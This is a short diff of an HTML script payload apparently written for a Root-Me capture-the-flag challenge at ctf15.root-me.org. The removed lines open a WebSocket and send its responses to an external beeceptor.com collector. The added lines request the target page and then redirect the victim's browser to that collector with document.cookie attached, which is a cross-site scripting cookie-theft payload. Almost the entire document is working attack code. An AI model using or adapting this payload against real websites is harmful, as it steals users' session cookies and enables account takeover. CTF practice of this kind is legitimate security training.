@@ -1,16 +1,15 @@
 <script>
-var ws = new WebSocket("ws://ctf15.root-me.org/ws"); // example path
+var url = "http://ctf15.root-me.org/";
+var req = new XMLHttpRequest();
 
-ws.onopen = function () {
-    ws.send("flag");
+req.onload = function () {
+    if (req.status === 200) {
+        //var data = encodeURIComponent(req.response.documentElement.innerHTML);
+        window.location = "https://toitoise.free.beeceptor.com/?s=in&c=" + document.cookie;
+    }
 };
 
-ws.onmessage = function (event) {
-    var data = encodeURIComponent(event.data);
-    fetch("https://toitoise.free.beeceptor.com/?c=" + data);
-};
-
-ws.onerror = function (e) {
-    fetch("https://toitoise.free.beeceptor.com/?err=ws_error");
-};
+req.open("GET", url, true);
+req.responseType = "document";
+req.send();
 </script>
